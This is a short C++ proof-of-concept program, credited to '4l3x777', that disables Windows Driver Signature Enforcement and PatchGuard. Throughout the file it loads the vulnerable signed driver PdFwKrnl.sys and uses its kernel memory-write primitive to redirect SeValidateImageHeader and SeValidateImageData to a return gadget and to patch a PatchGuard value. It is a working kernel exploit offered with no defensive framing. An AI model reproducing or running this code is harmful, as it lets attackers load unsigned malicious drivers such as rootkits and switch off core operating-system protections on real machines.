#include <iostream>
#include <string>
#include <byovd.h>
#include <kernel_utils.h>
#include <pattern.h>

int main(int argc, char* argv[])
{
	std::cout << "[*] PoC Driver Signature Enforcement (DSE) & PatchGuard Bypass by 4l3x777" << std::endl;	
	auto base_addr = KernelUtils::ntoskrnl_base();

	auto SeValidateImageHeader_offset = KernelUtils::get_sevalidateimageheader_offset();
	auto SeValidateImageData_offset = KernelUtils::get_sevalidateimagedata_offset();
	auto offset_ret = KernelUtils::get_ret_offset();
	auto patchguard_value_offset = KernelUtils::get_patchguardvalue_offset();
	auto PatchGuard_offset = KernelUtils::get_patchguard_offset();

	// load driver
	BYOVD_PROVIDER byovd_provider("PdFwKrnl.sys", "PdFwKrnl");

	auto addr_offset_ret = base_addr + offset_ret;
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageHeader_offset, &addr_offset_ret, 8);
	byovd_provider.WriteVirtualMemory(base_addr + SeValidateImageData_offset, &addr_offset_ret, 8);
	
	auto addr_patchgurd_value = base_addr + patchguard_value_offset;
	byovd_provider.WriteVirtualMemory(base_addr + PatchGuard_offset, &addr_patchgurd_value, 8);

	std::cout << "[*] done!" << std::endl;
	return 0;
}
